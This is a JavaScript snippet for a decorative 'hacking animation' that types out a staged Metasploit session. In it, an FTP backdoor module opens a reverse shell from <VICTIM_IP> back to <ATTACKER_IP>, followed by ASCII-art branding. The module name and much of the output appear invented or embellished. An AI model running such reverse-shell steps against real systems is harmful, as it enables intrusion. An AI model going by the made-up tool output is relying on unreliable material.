$(document).ready(function () {
  const textArray = textString.split("");
  const textElem = $(".hacking-animation__text");

  let count = 0;

  setInterval(() => {
    if (textArray[count] === "\n") {
      textElem.append("<br>");
    } else {
      textElem.append(`<span class="hacking-animation__character">${textArray[count]}</span>`);
    }

    count++;
    if (count === textArray.length) {
      count = 0;
    }
  }, 20);
});

var textString = `
///k1 Cyber Terminal///
<k1@phantom_node> ~ $ msfconsole -q
msf6 > use exploit/unix/ftp/vsftpd_303_backdoor
msf6 exploit(unix/ftp/vsftpd_303_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_303_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s)
   RPORT    21               yes       The target port (tcp)
   SRVHOST  0.0.0.0          no        The listen address (an interface may be specified)
   SRVPORT  8080             no        The listen port
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate
   TIMEOUT  60               no        Timeout in seconds


Payload options (unix/generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/vsftpd_303_backdoor) > set RHOSTS <VICTIM_IP>
msf6 exploit(unix/ftp/vsftpd_303_backdoor) > set RPORT 21
msf6 exploit(unix/ftp/vsftpd_303_backdoor) > set LHOST <ATTACKER_IP>
msf6 exploit(unix/ftp/vsftpd_303_backdoor) > set LPORT 4444
msf6 exploit(unix/ftp/vsftpd_303_backdoor) > show payloads
... (list of available payloads) ...
msf6 exploit(unix/ftp/vsftpd_303_backdoor) > set PAYLOAD unix/generic/shell_reverse_tcp
msf6 exploit(unix/ftp/vsftpd_303_backdoor) > show advanced

Module advanced options (exploit/unix/ftp/vsftpd_303_backdoor):

   Name                Value  Description
   ----                -----  -----------
   DisablePayloadHandler false  Disable the handler (for manual connections)
   ForceExploit        false  Override check and force execution
   TCP::MaxRetries     5      The maximum number of retries to attempt for a TCP connection
   TCP::NoDelay        false  Disable Nagle algorithm for TCP sockets
   VERBOSE             false  Enable verbose output


Payload advanced options (unix/generic/shell_reverse_tcp):

   Name          Value  Description
   ----          -----  -----------
   DisableTcpNodelay  false  Disable TCP Nodelay flag
   EnableStageEncoding  false  Encode the stager payload
   PrependSetresuid   false  Prepend setresuid(0,0,0) syscall
   PrependSetuid      false  Prepend setuid(0) syscall
   ReverseAllowProxy  false  Allow reverse connects to Socks proxies
   ReverseListenerBindAddress  0.0.0.0  The specific IP address the service will listen on
   ReverseListenerBindPort     The port to bind to on the system running the service.
   ReverseListenerThreaded false  Spawn a new thread for each incoming connection (required for handler)
   StagerRetryCount   10     The number of attempts to reconnect if the connection is lost
   StagerRetryWait    5      Number of seconds to wait between reconnect attempts
   VERBOSE            false  Enable verbose output


msf6 exploit(unix/ftp/vsftpd_303_backdoor) > exploit
[*] Started reverse TCP handler on <ATTACKER_IP>:4444
[*] Sending the magic backdoor command...
[*] Trying to connect to the backdoor...
[*] Connected to the backdoor!
[*] Spawning a shell...
[*] Shell session 2 opened (<ATTACKER_IP>:4444 -> <VICTIM_IP>:49152)

sh > whoami
root
sh > ... (rest of the commands) ...
sh > \x1b[exploit_v4.2
sh > // ADD :: CHMOD 777 /TEMP/DATA
sh > // EXECUTING PAYLOAD...
sh > 
sh > ██╗  ██╗ ██████╗ ██╗     ██╗ █████╗  ███████╗  █████╗
sh > ██║ ██╔╝ ██╔═══╝ ██║     ██║ ██╔══██╗ ██╔════╝ ██╔══██╗
sh > █████╔╝  ██║ ███╗██║     ██║ ███████║ ███████╗ ███████║
sh > ██╔═██╗  ██║   █║██║     ██║ ██╔══██║ ╚════██║ ██╔══██║
sh > ██║  ██╗ ╚█████╔╝███████╗██║ ██║  ██║ ███████║ ██║  ██║
sh > ╚═╝  ╚═╝  ╚═════╝╚══════╝╚═╝ ╚═╝  ╚═╝ ╚══════╝ ╚═╝  ╚═╝

sh > // PROCESS COMPLETE. RETURN CODE 0.
sh > \x1b[0m
sh > INITIATE PORT_SCAN
...
.....
...
....
...`;
